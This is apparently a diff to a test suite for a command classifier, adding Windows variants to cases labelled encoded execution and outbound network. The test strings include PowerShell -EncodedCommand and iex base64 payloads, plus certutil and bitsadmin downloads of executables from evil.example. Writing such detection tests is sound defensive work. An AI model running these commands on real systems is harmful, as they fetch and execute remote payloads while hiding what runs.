@@ -60,7 +60,9 @@ describe('PowerShell download-and-execute, the shape `curl … | sh` takes on Wi
 describe('PowerShell encoded execution', () => {
   it.each([
     'powershell -EncodedCommand SQBFAFgAIAAoAG4AZQB3ACkA',
+    'powershell /EncodedCommand SQBFAFgAIAAoAG4AZQB3ACkA',
     'powershell.exe -enc SQBFAFgAIAAoAG4AZQB3ACkA',
+    'powershell.exe /enc SQBFAFgAIAAoAG4AZQB3ACkA',
     'pwsh -ec SQBFAFgA',
     "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SQBFAFg=')))",
   ])('is encoded execution: %s', (command) =>
@@ -73,6 +75,8 @@ describe('PowerShell network commands', () => {
     'Invoke-RestMethod https://api.example/x',
     'Start-BitsTransfer -Source https://x.example/y -Destination z',
     'certutil -urlcache -split -f http://evil.example/x x.exe',
+    'certutil /urlcache -split -f http://evil.example/x x.exe',
+    'bitsadmin -transfer myjob http://evil.example/x C:\\x.exe',
     "(New-Object Net.WebClient).DownloadFile('https://x.example/a','a.exe')",
   ])('is outbound network: %s', (command) => expect(classesOf(command)).toContain('shell.network'));
 });
